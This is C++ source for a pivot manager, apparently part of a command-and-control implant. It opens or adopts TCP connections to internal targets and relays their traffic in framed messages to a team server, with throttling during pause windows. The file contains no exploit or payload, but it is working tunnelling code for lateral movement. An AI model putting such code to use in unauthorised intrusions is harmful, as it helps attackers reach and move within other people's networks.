#include "Components/Pivot/PivotManager.hpp"
#include "Common/Protocol/CmdDef.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Common/Protocol/FrameBuilder.hpp"
#include "Common/ThirdParty/json.hpp"
#include "Core/Concurrency/ThreadGovernor.hpp"

#include <thread>

namespace cleat {

    PivotManager& PivotManager::Instance() {
        static PivotManager instance;
        return instance;
    }

    PivotManager::PivotManager() : ops_(CreateNetworkOps()) {}

    PivotManager::~PivotManager() { CloseAll(); }

    void PivotManager::SetDataSender(PivotDataSender sender) {
        sender_ = std::move(sender);
    }

    void PivotManager::SetLowBandwidthCheck(LowBandwidthCheck check) {
        low_bandwidth_check_ = std::move(check);
    }

    void PivotManager::RemoveLocked(const std::string& pivot_id) {
        auto it = pivots_.find(pivot_id);
        if (it == pivots_.end()) return;
        std::unique_ptr<PivotConnection> conn = std::move(it->second);
        pivots_.erase(it);
        conn->running.store(false);
        conn->write_failed.store(true);
        {
            
            std::lock_guard<std::mutex> wl(conn->write_mu);
            conn->write_cv.notify_all();
        }
        ops_->CloseSocket(conn->sock);
        if (conn->writer_thread && conn->writer_thread->joinable()) {
            conn->writer_thread->join();
        }
        if (conn->reader_thread && conn->reader_thread->joinable()) {
            conn->reader_thread->join();
        }
    }

   
    void PivotManager::SweepClosed() {
        std::vector<std::pair<std::string, std::unique_ptr<PivotConnection>>> dead;
        {
            std::lock_guard<std::mutex> lock(mutex_);
            for (auto it = pivots_.begin(); it != pivots_.end();) {
                if (!it->second->running.load()) {
                    it->second->write_failed.store(true);
                    {
                        std::lock_guard<std::mutex> wl(it->second->write_mu);
                        it->second->write_cv.notify_all();
                    }
                    dead.emplace_back(it->first, std::move(it->second));
                    it = pivots_.erase(it);
                }
                else {
                    ++it;
                }
            }
        }
        for (auto& d : dead) {
            ops_->CloseSocket(d.second->sock);
            if (d.second->writer_thread && d.second->writer_thread->joinable()) {
                d.second->writer_thread->join();
            }
            if (d.second->reader_thread && d.second->reader_thread->joinable()) {
                d.second->reader_thread->join();
            }
        }
    }

    PivotManager::PivotConnection* PivotManager::RegisterLocked(std::unique_ptr<PivotConnection> conn) {
        auto it = pivots_.find(conn->pivot_id);
        if (it != pivots_.end()) {
            std::unique_ptr<PivotConnection> old = std::move(it->second);
            pivots_.erase(it);
            old->running.store(false);
            old->write_failed.store(true);
            {
                std::lock_guard<std::mutex> wl(old->write_mu);
                old->write_cv.notify_all();
            }
            ops_->CloseSocket(old->sock);

            if (old->writer_thread && old->writer_thread->joinable()) {
                old->writer_thread->join();
            }
            if (old->reader_thread && old->reader_thread->joinable()) {
                old->reader_thread->join();
            }
        }
        auto* raw = conn.get();
        pivots_[conn->pivot_id] = std::move(conn);
        raw->reader_thread = std::make_unique<std::thread>(&PivotManager::ReaderLoop, this, raw);
        raw->writer_thread = std::make_unique<std::thread>(&PivotManager::WriterLoop, this, raw);
        return raw;
    }

    bool PivotManager::StartPivot(const std::string& pivot_id,
        const std::string& target_host, uint16_t target_port) {
        if (pivot_id.empty() || target_host.empty() || target_port == 0) {
            CLEAT_LOGE(ErrDom::Piv, ErrCode::InvalidParam,
                "PivotManager: invalid params");
            return false;
        }

        if (low_bandwidth_check_ && low_bandwidth_check_()) {
            LOG_WARN("PivotManager: 低带宽通道, 拒绝新建 pivot " << pivot_id);
            return false;
        }

        SweepClosed();

        auto conn = std::make_unique<PivotConnection>();
        conn->pivot_id = pivot_id;
        conn->target_host = target_host;
        conn->target_port = target_port;

        conn->sock = ops_->CreateTcpSocket();
        if (conn->sock < 0) {
            CLEAT_LOGE(ErrDom::Piv, ErrCode::PlatformApiFailed,
                "PivotManager: create socket failed");
            return false;
        }

        ops_->SetSocketTimeout(conn->sock, 30000);
        if (!ops_->ConnectSocket(conn->sock, target_host, target_port)) {
            CLEAT_LOGE(ErrDom::Piv, ErrCode::PlatformApiFailed,
                "PivotManager: connect target failed "
                << target_host << ":" << target_port);
            ops_->CloseSocket(conn->sock);
            return false;
        }

        conn->running.store(true);
        {
            std::lock_guard<std::mutex> lock(mutex_);
            RegisterLocked(std::move(conn));
        }
        LOG_INFO("PivotManager: pivot up " << pivot_id
            << " -> " << target_host << ":" << target_port);
        return true;
    }

    bool PivotManager::AdoptSocket(const std::string& pivot_id, INetworkOps::SocketHandle sock,
        const std::string& target_host, uint16_t target_port) {
        if (pivot_id.empty() || sock < 0 || target_host.empty() || target_port == 0) {
            CLEAT_LOGE(ErrDom::Piv, ErrCode::InvalidParam,
                "PivotManager: AdoptSocket invalid params");
            return false;
        }
        if (low_bandwidth_check_ && low_bandwidth_check_()) {
            LOG_WARN("PivotManager: 低带宽通道, 拒绝 rportfwd 连接 " << pivot_id);
            return false;
        }

        SweepClosed();

        auto conn = std::make_unique<PivotConnection>();
        conn->pivot_id = pivot_id;
        conn->target_host = target_host;
        conn->target_port = target_port;
        conn->sock = sock;
        conn->running.store(true);
        {
            std::lock_guard<std::mutex> lock(mutex_);
            RegisterLocked(std::move(conn));
        }
        return true;
    }

    bool PivotManager::WriteToTarget(const std::string& pivot_id, const std::vector<uint8_t>& data) {
        if (data.empty()) return true;
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = pivots_.find(pivot_id);
        if (it == pivots_.end() || !it->second->running.load()) {
            return false;
        }
        PivotConnection* conn = it->second.get();
        {
            std::lock_guard<std::mutex> wl(conn->write_mu);
            if (conn->write_failed.load()) return false;
            if (conn->queued_bytes + data.size() > kMaxQueuedBytes) {
              
                conn->write_failed.store(true);
                conn->write_cv.notify_all(); // 唤醒写线程退出
                CLEAT_LOGE(ErrDom::Piv, ErrCode::ResourceExhausted,
                    "PivotManager: 写队列超限("
                    << conn->queued_bytes + data.size() << "B > " << kMaxQueuedBytes
                    << "B), 关闭 " << pivot_id << " 防止堆积");
                return false;
            }
            conn->write_queue.emplace_back(data);
            conn->queued_bytes += data.size();
            conn->write_cv.notify_one();
        }
        return true;
    }

    void PivotManager::ClosePivot(const std::string& pivot_id, const std::string& /*reason*/) {
        std::lock_guard<std::mutex> lock(mutex_);
        RemoveLocked(pivot_id);
        LOG_INFO("PivotManager: closed " << pivot_id);
    }

    void PivotManager::CloseAndNotify(const std::string& pivot_id, const std::string& reason) {
        bool existed = false;
        {
            std::lock_guard<std::mutex> lock(mutex_);
            existed = pivots_.find(pivot_id) != pivots_.end();
            if (existed) {
                RemoveLocked(pivot_id);
            }
        }
        if (existed) {
            SendCloseFrame(pivot_id, reason);
            LOG_INFO("PivotManager: closed " << pivot_id << " (" << reason << ")");
        }
    }

    void PivotManager::SendCloseFrame(const std::string& pivot_id, const std::string& reason) {
        if (!sender_) return;
        nlohmann::json close;
        close["cmd"] = Cmd::Pivot::Close();
        close["data"]["pivot_id"] = pivot_id;
        close["data"]["reason"] = reason;
        std::string js = close.dump();
        sender_(std::vector<uint8_t>(js.begin(), js.end()));
    }

    void PivotManager::SendOpenedFrame(const std::string& pivot_id, uint16_t listen_port,
        const std::string& target_host, uint16_t target_port) {
        if (!sender_) return;
        nlohmann::json opened;
        opened["cmd"] = Cmd::Pivot::Opened();
        opened["data"]["pivot_id"] = pivot_id;
        opened["data"]["listen_port"] = listen_port;
        opened["data"]["target_host"] = target_host;
        opened["data"]["target_port"] = target_port;
        std::string js = opened.dump();
        sender_(std::vector<uint8_t>(js.begin(), js.end()));
    }

    void PivotManager::CloseAll() {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto& pair : pivots_) {
            pair.second->running.store(false);
            pair.second->write_failed.store(true);
            {
                std::lock_guard<std::mutex> wl(pair.second->write_mu);
                pair.second->write_cv.notify_all();
            }
            ops_->CloseSocket(pair.second->sock);
        }
        for (auto& pair : pivots_) {
            if (pair.second->writer_thread && pair.second->writer_thread->joinable()) {
                pair.second->writer_thread->join();
            }
            if (pair.second->reader_thread && pair.second->reader_thread->joinable()) {
                pair.second->reader_thread->join();
            }
        }
        pivots_.clear();
    }

    size_t PivotManager::ActiveCount() const {
        std::lock_guard<std::mutex> lock(mutex_);
        return pivots_.size();
    }

 
    void PivotManager::ReaderLoop(PivotConnection* conn) {
        // 线程治理: 读侧 = 目标→TS 方向, 是暂停期的出站流量源 —— Tick 阻塞
        // 停读, 目标侧 TCP 自然背压; 恢复后排空。
        // 写侧(WriterLoop, TS→目标)无出站, 且其数据源(PivotData 帧)在断链期本就不可达。
        // 绑定 conn->running: 暂停期该连接被关闭时立即收摊, join 不必等窗口重开。
        const std::string gov_name = "pivot-relay-" + conn->pivot_id;
        ThreadGovernor::GovLoop gov(gov_name.c_str(), JobKind::Infrastructure, &conn->running);
        std::vector<uint8_t> buf(64 * 1024);
        while (conn->running.load()) {
            if (!gov.Tick()) break;
            // RecvSome(单次语义): 有数据即上行 —— 旧 RecvSocket 为凑满 64KB 缓冲会
            // 停在中继读侧(等到 socket 超时), 目标侧交互流量被整体延迟。
            int n = ops_->RecvSome(conn->sock, buf.data(), buf.size());
            if (n > 0) {
                if (!sender_) {
                    CLEAT_LOGE(ErrDom::Piv, ErrCode::InternalFailed,
                        "PivotManager: sender not injected, closing " << conn->pivot_id);
                    break;
                }
                nlohmann::json header;
                header["cmd"] = Cmd::Pivot::Data();
                header["data"]["pivot_id"] = conn->pivot_id;
                auto frame = FrameBuilder::Build(header,
                    std::vector<uint8_t>(buf.begin(), buf.begin() + n));
                sender_(frame);
                continue;
            }
            if (n == 0) {
                
                break;
            }
            int err = ops_->GetLastSocketError();
            if (err == ops_->GetSocketErrorTimeout()) {
                continue;
            }
            break;
        }

        conn->running.store(false);

        {
            std::lock_guard<std::mutex> wl(conn->write_mu);
            conn->write_cv.notify_all();
        }

        SendCloseFrame(conn->pivot_id, "target closed");
        LOG_DEBUG("PivotManager: target connection ended " << conn->pivot_id);
    }

   
    void PivotManager::WriterLoop(PivotConnection* conn) {
        while (conn->running.load() && !conn->write_failed.load()) {
            std::vector<uint8_t> data;
            {
                std::unique_lock<std::mutex> lk(conn->write_mu);
                conn->write_cv.wait(lk, [&] {
                    return !conn->write_queue.empty()
                        || !conn->running.load() || conn->write_failed.load();
                });
                if (!conn->running.load() || conn->write_failed.load()) break;
                data = std::move(conn->write_queue.front());
                conn->write_queue.pop_front();
                conn->queued_bytes -= data.size();
            }
            int n = ops_->SendSocket(conn->sock, data.data(), data.size());
            if (n <= 0) {
                CLEAT_LOGE(ErrDom::Piv, ErrCode::PlatformApiFailed,
                    "PivotManager: 写目标失败 n=" << n
                    << " err=" << ops_->GetLastSocketError()
                    << ", 关闭 " << conn->pivot_id);
                conn->write_failed.store(true);
                break;
            }
        }

        conn->running.store(false); // 让 SweepClosed 收集
        LOG_DEBUG("PivotManager: writer ended " << conn->pivot_id);
    }

}
